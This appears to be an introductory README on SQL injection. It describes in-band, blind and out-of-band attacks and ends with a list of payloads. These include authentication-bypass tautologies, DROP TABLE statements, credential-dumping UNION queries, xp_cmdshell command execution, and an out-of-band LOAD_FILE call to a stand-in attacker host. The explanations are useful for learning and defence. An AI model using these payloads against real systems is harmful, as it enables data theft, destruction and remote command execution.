<p align="center"><img align="center" width="300" height="300" src="./assets/SQL-Injection.gif"/></p>

# SQL Injection
SQL injection is a security vulnerability in which the attacker is able to view the data in the database. They can even delete or modify the data. We also have a few types of SQL Injection attack formats.

<code> You can learn more here:
https://owasp.org/www-community/attacks/SQL_Injection</code>

## SQL In-Band or SQLi
This attack occurs when the attacker uses the same communication channel to carry out attacks and obtain responses. An example of this is **error-based SQLi**, which triggers an error message when trying to use an SQL payload. The other format is **UNION-based SQLi**, in which using the SQL UNION database operator results in multiple SELECT statements in just one response.

**Example**: 
```sql
 UNION SELECT 1
```

## Blind SQLi
This is the type of SQL injection attack that queries the database and returns true or false.

**Example**
```sql
www.target.com/accounts.php?id=1

SELECT * FROM accounts WHERE ID = 1
```
## Out-of-Band SQL
When an attacker manages to manipulate the data query through hacking and transmit it to a server controlled by the attacker.
```sql
select * from target
into OUTFILE '\\My Malicious Server  IP'
```
## Payloads
Some examples of sql injection payloads
```sql
'

''

--

'1'='1'

' OR '1'='1

" OR "" = "

' OR 1=1 LIMIT 1 --

; DROP TABLE users; --

1; DROP TABLE users; --

'; SELECT @@VERSION --

1 UNION SELECT 1,2,3,4 --

' UNION SELECT username, password FROM users --

'; BEGIN TRANSACTION; UPDATE users SET balance=balance-100 WHERE username='attacker'; COMMIT; --

AND SLEEP(5)--

'; EXEC xp_cmdshell('dir') --

SELECT LOAD_FILE('\\\\attacker.com\\log.txt')
```
